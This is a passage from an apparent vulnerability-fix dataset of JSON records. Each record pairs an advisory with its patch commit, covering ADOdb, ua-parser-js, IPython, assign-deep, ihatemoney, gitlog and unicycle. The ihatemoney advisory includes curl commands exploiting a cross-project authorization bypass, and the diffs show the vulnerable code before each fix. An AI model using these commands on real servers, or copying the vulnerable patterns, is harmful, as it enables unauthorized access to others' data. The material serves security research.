(b4d5ce70034c5aac3a1d51d317d93c037a0938d2).\n\nThe simplest patch is to delete line 29 in `drivers\/adodb-postgres64.inc.php`:\n\n```php\ndiff --git a\/drivers\/adodb-postgres64.inc.php b\/drivers\/adodb-postgres64.inc.php\nindex d04b7f67..729d7141 100644\n--- a\/drivers\/adodb-postgres64.inc.php\n+++ b\/drivers\/adodb-postgres64.inc.php\n@@ -26,7 +26,6 @@ function adodb_addslashes($s)\n {\n    $len = strlen($s);\n    if ($len == 0) return \"''\";\n-   if (strncmp($s,\"'\",1) === 0 && substr($s,$len-1) == \"'\") return $s; \/\/ already quoted\n \n    return \"'\".addslashes($s).\"'\";\n }\n```\n\n### Workarounds\n\nEnsure the parameters passed to *ADOConnection::connect()* or related functions (_nConnect()_, _pConnect()_) are not surrounded by single quotes.\n\n### Credits\n\nThanks to **Emmet Leahy** (@meme-lord) of Sorcery Ltd for reporting this vulnerability, and to the [huntr](https:\/\/huntr.dev\/) team for their support.\n\n### References\n\n- Original issue report https:\/\/huntr.dev\/bounties\/bdf5f216-4499-4225-a737-b28bc6f5801c\/\n- ADOdb reference issue #793 \n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Add a note in issue #793\n* Contact the maintainers on [Gitter](https:\/\/gitter.im\/adodb\/adodb)","published_date":"2022-01-27","chain_len":2,"project":"https:\/\/github.com\/ADOdb\/ADOdb","commit_href":"https:\/\/github.com\/ADOdb\/ADOdb\/commit\/b4d5ce70034c5aac3a1d51d317d93c037a0938d2","commit_sha":"b4d5ce70034c5aac3a1d51d317d93c037a0938d2","patch":"MULTI","chain_ord":"['952de6c4273d9b1e91c2b838044f8c2111150c29', 'b4d5ce70034c5aac3a1d51d317d93c037a0938d2']","before_first_fix_commit":"{'c5415722049f36c446a4034d15f1d17943f11458'}","last_fix_commit":"b4d5ce70034c5aac3a1d51d317d93c037a0938d2","chain_ord_pos":2.0,"commit_datetime":"01\/10\/2022, 09:00:33","message":"Prevent auth bypass with PostgreSQL connections\n\nThanks to Emmet Leahy of Sorcery Ltd for reporting this vulnerability\n(CVE-2021-3850).\n\nRefactoring ADODB_postgres64::_connect():\n- Remove adodb_addslashes() function, which did not escape the\n  connection parameters when they are wrapped in single quotes\n  (root cause for the identified security issue).\n- Use addcslashes() instead of addslashes() to only escape `'` and `\\`,\n  to strictly follow pg_connect() documentation (addslashes() also\n  escapes `\"`)\n- Use an array and a foreach loop to build the connection string when\n  given individual parameters for host:port, user, password and dbname\n\nFixes #793","author":"Damien Regad","comments":null,"stats":"{'additions': 25, 'deletions': 22, 'total': 47}","files":"{'drivers\/adodb-postgres64.inc.php': {'additions': 25, 'deletions': 22, 'changes': 47, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/ADOdb\/ADOdb\/raw\/b4d5ce70034c5aac3a1d51d317d93c037a0938d2\/drivers%2Fadodb-postgres64.inc.php', 'patch': '@@ -22,15 +22,6 @@\\n \/\/ security - hide paths\\n if (!defined(\\'ADODB_DIR\\')) die();\\n \\n-function adodb_addslashes($s)\\n-{\\n-\\t$len = strlen($s);\\n-\\tif ($len == 0) return \"\\'\\'\";\\n-\\tif (strncmp($s,\"\\'\",1) === 0 && substr($s,$len-1) == \"\\'\") return $s; \/\/ already quoted\\n-\\n-\\treturn \"\\'\".addslashes($s).\"\\'\";\\n-}\\n-\\n class ADODB_postgres64 extends ADOConnection{\\n \\tvar $databaseType = \\'postgres64\\';\\n \\tvar $dataProvider = \\'postgres\\';\\n@@ -693,21 +684,33 @@ function _connect($str,$user=\\'\\',$pwd=\\'\\',$db=\\'\\',$ctype=0)\\n \\n \\t\\t$this->_errorMsg = false;\\n \\n+\\t\\t\/\/ If $user, $pwd and $db are all null, then $str is a pg_connect()\\n+\\t\\t\/\/ connection string. Otherwise we expect it to be a hostname,\\n+\\t\\t\/\/ with optional port separated by \\':\\'\\n \\t\\tif ($user || $pwd || $db) {\\n-\\t\\t\\t$user = adodb_addslashes($user);\\n-\\t\\t\\t$pwd = adodb_addslashes($pwd);\\n-\\t\\t\\tif (strlen($db) == 0) $db = \\'template1\\';\\n-\\t\\t\\t$db = adodb_addslashes($db);\\n-\\t\\t\\tif ($str)  {\\n-\\t\\t\\t\\t$host = explode(\":\", $str);\\n-\\t\\t\\t\\tif ($host[0]) $str = \"host=\".adodb_addslashes($host[0]);\\n-\\t\\t\\t\\telse $str = \\'\\';\\n-\\t\\t\\t\\tif (isset($host[1])) $str .= \" port=$host[1]\";\\n-\\t\\t\\t\\telse if (!empty($this->port)) $str .= \" port=\".$this->port;\\n+\\t\\t\\t\/\/ Hostname & port\\n+\\t\\t\\tif ($str) {\\n+\\t\\t\\t\\t$host = explode(\\':\\', $str);\\n+\\t\\t\\t\\tif ($host[0]) {\\n+\\t\\t\\t\\t\\t$conn[\\'host\\'] = $host[0];\\n+\\t\\t\\t\\t}\\n+\\t\\t\\t\\tif (isset($host[1])) {\\n+\\t\\t\\t\\t\\t$conn[\\'port\\'] = (int)$host[1];\\n+\\t\\t\\t\\t} elseif (!empty($this->port)) {\\n+\\t\\t\\t\\t\\t$conn[\\'port\\'] = $this->port;\\n+\\t\\t\\t\\t}\\n+\\t\\t\\t}\\n+\\t\\t\\t$conn[\\'user\\'] = $user;\\n+\\t\\t\\t$conn[\\'password\\'] = $pwd;\\n+\\t\\t\\t\/\/ @TODO not sure why we default to \\'template1\\', pg_connect() uses the username when dbname is empty\\n+\\t\\t\\t$conn[\\'dbname\\'] = $db ?: \\'template1\\';\\n+\\n+\\t\\t\\t\/\/ Generate connection string\\n+\\t\\t\\t$str = \\'\\';\\n+\\t\\t\\tforeach ($conn as $param => $value) {\\n+\\t\\t\\t\\t\/\/ Escaping single quotes and backslashes per pg_connect() documentation\\n+\\t\\t\\t\\t$str .= $param . \"=\\'\" . addcslashes($value, \"\\'\\\\\\\\\") . \"\\' \";\\n \\t\\t\\t}\\n-\\t\\t\\tif ($user) $str .= \" user=\".$user;\\n-\\t\\t\\tif ($pwd)  $str .= \" password=\".$pwd;\\n-\\t\\t\\tif ($db)   $str .= \" dbname=\".$db;\\n \\t\\t}\\n \\n \\t\\t\/\/if ($user) $linea = \"user=$user host=$linea password=$pwd dbname=$db port=5432\";'}}","message_norm":"prevent auth bypass with postgresql connections\n\nthanks to emmet leahy of sorcery ltd for reporting this vulnerability\n(cve-2021-3850).\n\nrefactoring adodb_postgres64::_connect():\n- remove adodb_addslashes() function, which did not escape the\n  connection parameters when they are wrapped in single quotes\n  (root cause for the identified security issue).\n- use addcslashes() instead of addslashes() to only escape `'` and `\\`,\n  to strictly follow pg_connect() documentation (addslashes() also\n  escapes `\"`)\n- use an array and a foreach loop to build the connection string when\n  given individual parameters for host:port, user, password and dbname\n\nfixes #793","language":"en","entities":"[('prevent', 'ACTION', ''), ('auth', 'SECWORD', ''), ('bypass', 'SECWORD', ''), ('vulnerability', 'SECWORD', ''), ('cve-2021-3850', 'VULNID', 'CVE'), ('remove', 'ACTION', ''), ('escape', 'SECWORD', ''), ('security', 'SECWORD', ''), ('issue', 'FLAW', ''), ('escape', 'SECWORD', ''), ('escapes', 'SECWORD', ''), ('password', 'SECWORD', ''), ('fixes', 'ACTION', ''), ('#793', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['drivers\/adodb-postgres64.inc.php'])","num_files":1.0},{"index":757,"vuln_id":"GHSA-662x-fhqg-9p8v","cwe_id":"{'CWE-400'}","score":7.5,"chain":"{'https:\/\/github.com\/faisalman\/ua-parser-js\/commit\/233d3bae22a795153a7e6638887ce159c63e557d'}","dataset":"osv","summary":"Regular Expression Denial of Service in ua-parser-js The package ua-parser-js before 0.7.22 are vulnerable to Regular Expression Denial of Service (ReDoS) via the regex for Redmi Phones and Mi Pad Tablets UA.","published_date":"2021-05-07","chain_len":1,"project":"https:\/\/github.com\/faisalman\/ua-parser-js","commit_href":"https:\/\/github.com\/faisalman\/ua-parser-js\/commit\/233d3bae22a795153a7e6638887ce159c63e557d","commit_sha":"233d3bae22a795153a7e6638887ce159c63e557d","patch":"SINGLE","chain_ord":"['233d3bae22a795153a7e6638887ce159c63e557d']","before_first_fix_commit":"{'5230745280ba8aee775b0f5d2c8a2332f8ef2c4e'}","last_fix_commit":"233d3bae22a795153a7e6638887ce159c63e557d","chain_ord_pos":1.0,"commit_datetime":"09\/12\/2020, 08:47:15","message":"Fix potential ReDoS vulnerability","author":"Faisal Salman","comments":null,"stats":"{'additions': 2, 'deletions': 2, 'total': 4}","files":"{'src\/ua-parser.js': {'additions': 2, 'deletions': 2, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/faisalman\/ua-parser-js\/raw\/233d3bae22a795153a7e6638887ce159c63e557d\/src%2Fua-parser.js', 'patch': \"@@ -585,9 +585,9 @@\\n             \/android.+(hm[\\\\s\\\\-_]*note?[\\\\s_]*(?:\\\\d\\\\w)?)\\\\s+build\/i,               \/\/ Xiaomi Hongmi\\n             \/android.+(mi[\\\\s\\\\-_]*(?:a\\\\d|one|one[\\\\s_]plus|note lte)?[\\\\s_]*(?:\\\\d?\\\\w?)[\\\\s_]*(?:plus)?)\\\\s+build\/i,    \\n                                                                                 \/\/ Xiaomi Mi\\n-            \/android.+(redmi[\\\\s\\\\-_]*(?:note)?(?:[\\\\s_]*[\\\\w\\\\s]+))\\\\s+build\/i       \/\/ Redmi Phones\\n+            \/android.+(redmi[\\\\s\\\\-_]*(?:note)?(?:[\\\\s_]?[\\\\w\\\\s]+))\\\\s+build\/i       \/\/ Redmi Phones\\n             ], [[MODEL, \/_\/g, ' '], [VENDOR, 'Xiaomi'], [TYPE, MOBILE]], [\\n-            \/android.+(mi[\\\\s\\\\-_]*(?:pad)(?:[\\\\s_]*[\\\\w\\\\s]+))\\\\s+build\/i            \/\/ Mi Pad tablets\\n+            \/android.+(mi[\\\\s\\\\-_]*(?:pad)(?:[\\\\s_]?[\\\\w\\\\s]+))\\\\s+build\/i            \/\/ Mi Pad tablets\\n             ],[[MODEL, \/_\/g, ' '], [VENDOR, 'Xiaomi'], [TYPE, TABLET]], [\\n             \/android.+;\\\\s(m[1-5]\\\\snote)\\\\sbuild\/i                                \/\/ Meizu\\n             ], [MODEL, [VENDOR, 'Meizu'], [TYPE, MOBILE]], [\"}}","message_norm":"fix potential redos vulnerability","language":"ca","entities":"[('fix', 'ACTION', ''), ('redos', 'SECWORD', ''), ('vulnerability', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/ua-parser.js'])","num_files":1.0},{"index":763,"vuln_id":"GHSA-66gw-5xpf-gfp5","cwe_id":"{'CWE-79'}","score":6.1,"chain":"{'https:\/\/github.com\/ipython\/ipython\/commit\/c2078a53543ed502efd968649fee1125e0eb549c', 'https:\/\/github.com\/ipython\/ipython\/commit\/7222bd53ad089a65fd610fab4626f9d0ab47dfce'}","dataset":"osv","summary":"Improper Neutralization of Input During Web Page Generation in IPython Cross-site scripting (XSS) vulnerability in IPython before 3.2 allows remote attackers to inject arbitrary web script or HTML via vectors involving JSON error messages and the \/api\/notebooks path.","published_date":"2022-05-13","chain_len":2,"project":"https:\/\/github.com\/ipython\/ipython","commit_href":"https:\/\/github.com\/ipython\/ipython\/commit\/c2078a53543ed502efd968649fee1125e0eb549c","commit_sha":"c2078a53543ed502efd968649fee1125e0eb549c","patch":"MULTI","chain_ord":"['7222bd53ad089a65fd610fab4626f9d0ab47dfce', 'c2078a53543ed502efd968649fee1125e0eb549c']","before_first_fix_commit":"{'64966ea2ae0d44a9c059efcb299db66cbc66ef04'}","last_fix_commit":"c2078a53543ed502efd968649fee1125e0eb549c","chain_ord_pos":2.0,"commit_datetime":"06\/22\/2015, 04:12:34","message":"Set content type in json_error to application\/json","author":"Kyle Kelley","comments":null,"stats":"{'additions': 2, 'deletions': 0, 'total': 2}","files":"{'IPython\/html\/base\/handlers.py': {'additions': 2, 'deletions': 0, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/ipython\/ipython\/raw\/c2078a53543ed502efd968649fee1125e0eb549c\/IPython%2Fhtml%2Fbase%2Fhandlers.py', 'patch': '@@ -339,6 +339,7 @@ def wrapper(self, *args, **kwargs):\\n             message = e.log_message\\n             self.log.warn(message)\\n             self.set_status(e.status_code)\\n+            self.set_header(\\'Content-Type\\', \\'application\/json\\')\\n             self.finish(json.dumps(dict(message=message)))\\n         except Exception:\\n             self.log.error(\"Unhandled error in API request\", exc_info=True)\\n@@ -348,6 +349,7 @@ def wrapper(self, *args, **kwargs):\\n             self.set_status(status)\\n             tb_text = \\'\\'.join(traceback.format_exception(t, value, tb))\\n             reply = dict(message=message, traceback=tb_text)\\n+            self.set_header(\\'Content-Type\\', \\'application\/json\\')\\n             self.finish(json.dumps(reply))\\n         else:\\n             return result'}}","message_norm":"set content type in json_error to application\/json","language":"en","entities":"[('json_error', 'FLAW', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['IPython\/html\/base\/handlers.py'])","num_files":1.0},{"index":769,"vuln_id":"GHSA-66rh-8fw6-59q6","cwe_id":"{'CWE-915', 'CWE-20'}","score":7.5,"chain":"{'https:\/\/github.com\/jonschlinkert\/assign-deep\/commit\/8e3cc4a34246733672c71e96532105384937e56c', 'https:\/\/github.com\/jonschlinkert\/assign-deep\/commit\/90bf1c551d05940898168d04066bbf15060f50cc'}","dataset":"osv","summary":"assign-deep Vulnerable to Prototype Pollution Versions of `assign-deep` prior to 1.0.1 and 0.4.8 are vulnerable to Prototype Pollution. The `assign` function fails to validate which Object properties it updates. This allows attackers to modify the prototype of Object, causing the addition or modification of an existing property on all objects.\n\n## Recommendation\n\nUpgrade to versions 1.0.1, 0.4.8, or later.","published_date":"2019-08-21","chain_len":2,"project":"https:\/\/github.com\/jonschlinkert\/assign-deep","commit_href":"https:\/\/github.com\/jonschlinkert\/assign-deep\/commit\/8e3cc4a34246733672c71e96532105384937e56c","commit_sha":"8e3cc4a34246733672c71e96532105384937e56c","patch":"MULTI","chain_ord":"['90bf1c551d05940898168d04066bbf15060f50cc', '8e3cc4a34246733672c71e96532105384937e56c']","before_first_fix_commit":"{'24412bd2b59bc128437819c4a4518a7b7148d81a'}","last_fix_commit":"8e3cc4a34246733672c71e96532105384937e56c","chain_ord_pos":2.0,"commit_datetime":"06\/25\/2019, 17:46:37","message":"ensure keys are valid","author":"doowb","comments":null,"stats":"{'additions': 9, 'deletions': 1, 'total': 10}","files":"{'index.js': {'additions': 9, 'deletions': 1, 'changes': 10, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/jonschlinkert\/assign-deep\/raw\/8e3cc4a34246733672c71e96532105384937e56c\/index.js', 'patch': \"@@ -37,7 +37,7 @@ function extend(target, obj) {\\n   assignSymbols(target, obj);\\n \\n   for (var key in obj) {\\n-    if (key !== '__proto__' && hasOwn(obj, key)) {\\n+    if (isValidKey(key) && hasOwn(obj, key)) {\\n       var val = obj[key];\\n       if (isObject(val)) {\\n         if (typeOf(target[key]) === 'undefined' && typeOf(val) === 'function') {\\n@@ -68,6 +68,14 @@ function hasOwn(obj, key) {\\n   return Object.prototype.hasOwnProperty.call(obj, key);\\n }\\n \\n+\/**\\n+ * Returns true if the given `key` is a valid key that can be used for assigning properties.\\n+ *\/\\n+\\n+function isValidKey(key) {\\n+  return key !== '__proto__' && key !== 'constructor' && key !== 'prototype';\\n+}\\n+\\n \/**\\n  * Expose `assign`\\n  *\/\"}}","message_norm":"ensure keys are valid","language":"af","entities":"[('ensure', 'ACTION', ''), ('keys', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['index.js'])","num_files":1.0},{"index":776,"vuln_id":"GHSA-67j9-c52g-w2q9","cwe_id":"{'CWE-863'}","score":4.9,"chain":"{'https:\/\/github.com\/spiral-project\/ihatemoney\/commit\/8d77cf5d5646e1d2d8ded13f0660638f57e98471'}","dataset":"osv","summary":"Authorization Bypass in I hate money ### Impact\nAn authenticated member of one project can modify and delete members of another project, without knowledge of this other project's private code. This can be further exploited to access all bills of another project without knowledge of this other project's private code.\n\nWith the default configuration, anybody is allowed to create a new project. An attacker can create a new project and then use it to become authenticated and exploit this flaw. As such, the exposure is similar to an unauthenticated attack, because it is trivial to become authenticated.\n\n### Patches\n```diff\n ihatemoney\/models.py | 4 ++--\n 1 file changed, 2 insertions(+), 2 deletions(-)\n\ndiff --git a\/ihatemoney\/models.py b\/ihatemoney\/models.py\nindex fe7b519..5691c75 100644\n--- a\/ihatemoney\/models.py\n+++ b\/ihatemoney\/models.py\n@@ -380,7 +380,7 @@ class Person(db.Model):\n         def get_by_name(self, name, project):\n             return (\n                 Person.query.filter(Person.name == name)\n-                .filter(Project.id == project.id)\n+                .filter(Person.project_id == project.id)\n                 .one()\n             )\n \n@@ -389,7 +389,7 @@ class Person(db.Model):\n                 project = g.project\n             return (\n                 Person.query.filter(Person.id == id)\n-                .filter(Project.id == project.id)\n+                .filter(Person.project_id == project.id)\n                 .one()\n             )\n \n```\n\n### Workarounds\n\nTo limit the impact, it is possible to disable public project creation by setting `ALLOW_PUBLIC_PROJECT_CREATION = False` in the configuration (see [documentation](https:\/\/ihatemoney.readthedocs.io\/en\/latest\/configuration.html)). Existing users will still be able to exploit the flaw, but this will prevent an external attacker from creating a new project.\n\n### For more information\n\n`Person.query.get()` and `Person.query.get_by_name()` were mistakenly running a database join on the Project table without constraining the result.\n\nAs a result, `Person.query.get(42, \"projectfoo\")` would return the Person with id=42, even if it is not associated to the project \"projectfoo\".  The only condition is that \"projectfoo\" must exist.\n\nThis flaw can be exploited in several places:\n\n1) API: PUT requests to `\/api\/projects\/<project>\/members\/<personID>` will succeed even though `<personID>` is not a member of `<project>`.\n\n   This allows an authenticated attacker to alter the state of a member (name, weight, activated) in any project.  In addition, the altered member will no longer be associated with its original project but will be associated to the attacker project instead, breaking many features of IHateMoney.  For instance, bills referencing the altered member will no longer be visible in the original project.\n\n   This causes an additional information disclosure and loss of integrity on bills: the attacker will now be able to see, edit and delete bills belonging to the altered member, because IHateMoney now believes that these bills are associated to the attacker project through the altered member.\n\n   For instance, assume that `Person(id=42)` is a member of project \"targetProject\", and that the attacker has access to another project \"attackerProject\" with the private code \"attackerPassword\".  The attacker can modify `Person(id=42)` with this command:\n\n     $ curl -X PUT -d \"name=Pwn3d&activated=1\" --basic -u attackerProject:attackerPassword http:\/\/$SERVER\/api\/projects\/attackerProject\/members\/42\n\n   The attacker can now see, edit and delete bills paid by `Person(id=42)` by simply browsing to http:\/\/$SERVER\/attackerProject\/\n\n2) Editing a member through the web interface at `\/<project>\/members\/<personID>\/edit` will succeed even though `<personID>` is not a member of `<project>`.\n\n   This is very similar to the PUT exploit.  Reusing the same example, the attacker needs to login to its \"attackerProject\" project with the private code \"attackerPassword\".  It can then alter the state of `Person(id=42)` by accessing the edit form at the following URL:\n\n     http:\/\/$SERVER\/attackerProject\/members\/42\/edit\n\n   Again, as a result of the alteration, the altered member will become associated to the project \"attackerProject\", resulting in the same information disclosure and loss of integrity on bills.\n\n3) API: DELETE requests to `\/api\/projects\/<project>\/members\/<personID>` will similarly allow to delete the member `<personID>` even if it belongs to a different project than `<project>`.\n\n     $ curl -X DELETE --basic -u attackerProject:attackerPassword http:\/\/$SERVER\/api\/projects\/attackerProject\/members\/42\n\n   The impact is less serious than with PUT, because DELETE only deactivates a member (it does not really delete it).\n\nAll these exploits require authentication: an attacker needs to know a valid project name and its associated \"private code\".  Once this requirement is fullfilled, the attacker can exploit this flaw to alter the state of members in any other project, without needing to know the target project name or its private code.\n\n`Person.query.get_by_name()` suffers from the same issue as `Person.query.get()`.  It has an additional issue: if multiple Person objects with the same name exist (this is possible if they are associated to different projects), `get_by_name()` will crash with `MultipleResultsFound` because of the call to `one()`.\n\nHowever, since `Person.query.get_by_name()` is currently not used anywhere in IHateMoney, the bug affecting this function has no impact and is not exploitable.","published_date":"2020-07-27","chain_len":1,"project":"https:\/\/github.com\/spiral-project\/ihatemoney","commit_href":"https:\/\/github.com\/spiral-project\/ihatemoney\/commit\/8d77cf5d5646e1d2d8ded13f0660638f57e98471","commit_sha":"8d77cf5d5646e1d2d8ded13f0660638f57e98471","patch":"SINGLE","chain_ord":"['8d77cf5d5646e1d2d8ded13f0660638f57e98471']","before_first_fix_commit":"{'040d76af83411fb58ab400dc4eac909191a3e5fa'}","last_fix_commit":"8d77cf5d5646e1d2d8ded13f0660638f57e98471","chain_ord_pos":1.0,"commit_datetime":"07\/17\/2020, 15:43:33","message":"Fix unauthorized access and modification of project data (CVE-2020-15120)\n\nAn authenticated member of one project can modify and delete members of\nanother project, without knowledge of this other project's private\ncode. This can be further exploited to access all bills of another project\nwithout knowledge of this other project's private code.\n\nWith the default configuration, anybody is allowed to create a new\nproject. An attacker can create a new project and then use it to become\nauthenticated and exploit this flaw. As such, the exposure is similar to\nan unauthenticated attack, because it is trivial to become authenticated.\n\nThis issue was caused by a wrong database queries in PersonQuery.\n\nFor more details, see https:\/\/github.com\/spiral-project\/ihatemoney\/security\/advisories\/GHSA-67j9-c52g-w2q9","author":"Baptiste Jonglez","comments":null,"stats":"{'additions': 2, 'deletions': 2, 'total': 4}","files":"{'ihatemoney\/models.py': {'additions': 2, 'deletions': 2, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/spiral-project\/ihatemoney\/raw\/8d77cf5d5646e1d2d8ded13f0660638f57e98471\/ihatemoney%2Fmodels.py', 'patch': '@@ -380,7 +380,7 @@ class PersonQuery(BaseQuery):\\n         def get_by_name(self, name, project):\\n             return (\\n                 Person.query.filter(Person.name == name)\\n-                .filter(Project.id == project.id)\\n+                .filter(Person.project_id == project.id)\\n                 .one()\\n             )\\n \\n@@ -389,7 +389,7 @@ def get(self, id, project=None):\\n                 project = g.project\\n             return (\\n                 Person.query.filter(Person.id == id)\\n-                .filter(Project.id == project.id)\\n+                .filter(Person.project_id == project.id)\\n                 .one()\\n             )'}}","message_norm":"fix unauthorized access and modification of project data (cve-2020-15120)\n\nan authenticated member of one project can modify and delete members of\nanother project, without knowledge of this other project's private\ncode. this can be further exploited to access all bills of another project\nwithout knowledge of this other project's private code.\n\nwith the default configuration, anybody is allowed to create a new\nproject. an attacker can create a new project and then use it to become\nauthenticated and exploit this flaw. as such, the exposure is similar to\nan unauthenticated attack, because it is trivial to become authenticated.\n\nthis issue was caused by a wrong database queries in personquery.\n\nfor more details, see https:\/\/github.com\/spiral-project\/ihatemoney\/security\/advisories\/ghsa-67j9-c52g-w2q9","language":"en","entities":"[('fix', 'ACTION', ''), ('cve-2020-15120', 'VULNID', 'CVE'), ('exploited', 'SECWORD', ''), ('attacker', 'FLAW', ''), ('exploit', 'SECWORD', ''), ('flaw', 'FLAW', ''), ('unauthenticated', 'SECWORD', ''), ('attack', 'FLAW', ''), ('issue', 'FLAW', ''), ('https:\/\/github.com\/spiral-project\/ihatemoney\/security\/advisories\/ghsa-67j9-c52g-w2q9', 'URL', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['ihatemoney\/models.py'])","num_files":1.0},{"index":777,"vuln_id":"GHSA-67mm-m3wx-j7fr","cwe_id":"{'CWE-77'}","score":9.8,"chain":"{'https:\/\/github.com\/domharrington\/node-gitlog\/pull\/65\/commits\/bb22ffb2c907e0284f887ab625e12b88c31f4bf4'}","dataset":"osv","summary":"Command injection in gitlog The gitlog function in src\/index.ts in gitlog before 4.0.4 has a command injection vulnerability.","published_date":"2021-04-13","chain_len":1,"project":"https:\/\/github.com\/domharrington\/node-gitlog","commit_href":"https:\/\/github.com\/domharrington\/node-gitlog\/pull\/65\/commits\/bb22ffb2c907e0284f887ab625e12b88c31f4bf4","commit_sha":"bb22ffb2c907e0284f887ab625e12b88c31f4bf4","patch":"SINGLE","chain_ord":"['bb22ffb2c907e0284f887ab625e12b88c31f4bf4']","before_first_fix_commit":"{'256a9617fcaa04bba7652ef2a20bc0aa6cc5dbe1'}","last_fix_commit":"bb22ffb2c907e0284f887ab625e12b88c31f4bf4","chain_ord_pos":1.0,"commit_datetime":"12\/17\/2020, 11:48:28","message":"Use child_process.execFile instead of child_process.exec","author":"Ron","comments":null,"stats":"{'additions': 24, 'deletions': 22, 'total': 46}","files":"{'src\/index.ts': {'additions': 24, 'deletions': 22, 'changes': 46, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/domharrington\/node-gitlog\/raw\/bb22ffb2c907e0284f887ab625e12b88c31f4bf4\/src%2Findex.ts', 'patch': '@@ -1,4 +1,4 @@\\n-import { exec, execSync, ExecSyncOptions, ExecException } from \"child_process\";\\n+import { execFile, execFileSync, ExecSyncOptions, ExecException } from \"child_process\";\\n import { existsSync } from \"fs\";\\n import createDebugger from \"debug\";\\n \\n@@ -126,8 +126,8 @@ const defaultOptions = {\\n };\\n \\n \/** Add optional parameter to command *\/\\n-function addOptional<Field extends string = DefaultField>(\\n-  command: string,\\n+function addOptionalArgument<Field extends string = DefaultField>(\\n+  command: string[],\\n   options: GitlogOptions<Field>\\n ) {\\n   let commandWithOptions = command;\\n@@ -140,9 +140,9 @@ function addOptional<Field extends string = DefaultField>(\\n     \"committer\",\\n   ] as const;\\n \\n-  for (let i = cmdOptional.length; i--; ) {\\n+  for (let i = cmdOptional.length; i--;) {\\n     if (options[cmdOptional[i]]) {\\n-      commandWithOptions += ` --${cmdOptional[i]}=\"${options[cmdOptional[i]]}\"`;\\n+      commandWithOptions.push(`--${cmdOptional[i]}=${options[cmdOptional[i]]}`);\\n     }\\n   }\\n \\n@@ -234,30 +234,30 @@ const parseCommits = <T extends string>(\\n };\\n \\n \/** Run \"git log\" and return the result as JSON *\/\\n-function createCommand<T extends CommitField | DefaultField = DefaultField>(\\n+function createCommandArguments<T extends CommitField | DefaultField = DefaultField>(\\n   options: GitlogOptions<T>\\n ) {\\n   \/\/ Start constructing command\\n-  let command = \"git log -l0 \";\\n+  let command: string[] = [\"log\", \"-l0\"];\\n \\n   if (options.findCopiesHarder) {\\n-    command += \"--find-copies-harder \";\\n+    command.push(\"--find-copies-harder\");\\n   }\\n \\n   if (options.all) {\\n-    command += \"--all \";\\n+    command.push(\"--all\");\\n   }\\n \\n   if (options.includeMergeCommitFiles) {\\n-    command += \"-m \";\\n+    command.push(\"-m\");\\n   }\\n \\n-  command += `-n ${options.number}`;\\n+  command.push(`-n ${options.number}`);\\n \\n-  command = addOptional(command, options);\\n+  command = addOptionalArgument(command, options);\\n \\n   \/\/ Start of custom format\\n-  command += \\' --pretty=\"@begin@\\';\\n+  let prettyArgument: string = \\'--pretty=@begin@\\';\\n \\n   \/\/ Iterating through the fields and adding them to the custom format\\n   if (options.fields) {\\n@@ -266,29 +266,31 @@ function createCommand<T extends CommitField | DefaultField = DefaultField>(\\n         throw new Error(`Unknown field: ${field}`);\\n       }\\n \\n-      command += delimiter + fieldMap[field];\\n+      prettyArgument += delimiter + fieldMap[field];\\n     });\\n   }\\n \\n   \/\/ Close custom format\\n-  command += \\'@end@\"\\';\\n+  prettyArgument += \\'@end@\\';\\n+  command.push(prettyArgument);\\n \\n   \/\/ Append branch (revision range) if specified\\n   if (options.branch) {\\n-    command += ` ${options.branch}`;\\n+    command.push(options.branch);\\n   }\\n \\n   \/\/ File and file status\\n   if (options.nameStatus && !options.fileLineRange) {\\n-    command += \" --name-status\";\\n+    command.push(\"--name-status\");\\n   }\\n \\n   if (options.fileLineRange) {\\n-    command += ` -L ${options.fileLineRange.startLine},${options.fileLineRange.endLine}:${options.fileLineRange.file}`;\\n+    command.push(`-L ${options.fileLineRange.startLine},${options.fileLineRange.endLine}:${options.fileLineRange.file}`);\\n   }\\n \\n   if (options.file) {\\n-    command += ` -- ${options.file}`;\\n+    command.push(\"--\");\\n+    command.push(options.file);\\n   }\\n \\n   debug(\"command\", options.execOptions, command);\\n@@ -342,10 +344,10 @@ function gitlog<Field extends CommitField = DefaultField>(\\n     ...userOptions,\\n   };\\n   const execOptions = { cwd: userOptions.repo, ...userOptions.execOptions };\\n-  const command = createCommand(options);\\n+  const commandArguments = createCommandArguments(options);\\n \\n   if (!cb) {\\n-    const stdout = execSync(command, execOptions).toString();\\n+    const stdout = execFileSync(\"git\", commandArguments, execOptions).toString();\\n     const commits = stdout.split(\"@begin@\");\\n \\n     if (commits[0] === \"\") {\\n@@ -356,7 +358,7 @@ function gitlog<Field extends CommitField = DefaultField>(\\n     return parseCommits(commits, options.fields, options.nameStatus);\\n   }\\n \\n-  exec(command, execOptions, (err, stdout, stderr) => {\\n+  execFile(\"git\", commandArguments, execOptions, (err, stdout, stderr) => {\\n     debug(\"stdout\", stdout);\\n     const commits = stdout.split(\"@begin@\");'}}","message_norm":"use child_process.execfile instead of child_process.exec","language":"en","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/index.ts'])","num_files":1.0},{"index":780,"vuln_id":"GHSA-686f-ch3r-xwmh","cwe_id":"{'CWE-362', 'CWE-119'}","score":8.1,"chain":"{'https:\/\/github.com\/udoprog\/unicycle\/commit\/6a6c367a0c25f86f998fa315ea90c328f685b194', 'https:\/\/github.com\/udoprog\/unicycle\/commit\/92f40b4a2c671553dfa96feacff0265206c44ce5'}","dataset":"osv","summary":"Data races in unicycle Affected versions of this crate unconditionally implemented `Send` & `Sync` for types `PinSlab<T>` & `Unordered<T, S>`. This allows sending non-Send types to other threads and concurrently accessing non-Sync types from multiple threads.\n\nThis can result in a data race & memory corruption when types that provide internal mutability without synchronization are contained within `PinSlab<T>` or `Unordered<T, S>` and accessed concurrently from multiple threads.\n\nThe flaw was corrected in commits 92f40b4 & 6a6c367 by adding trait bound `T: Send` to `Send` impls for `PinSlab<T>` & `Unordered<T, S>` and adding `T: Sync` to `Sync` impls for 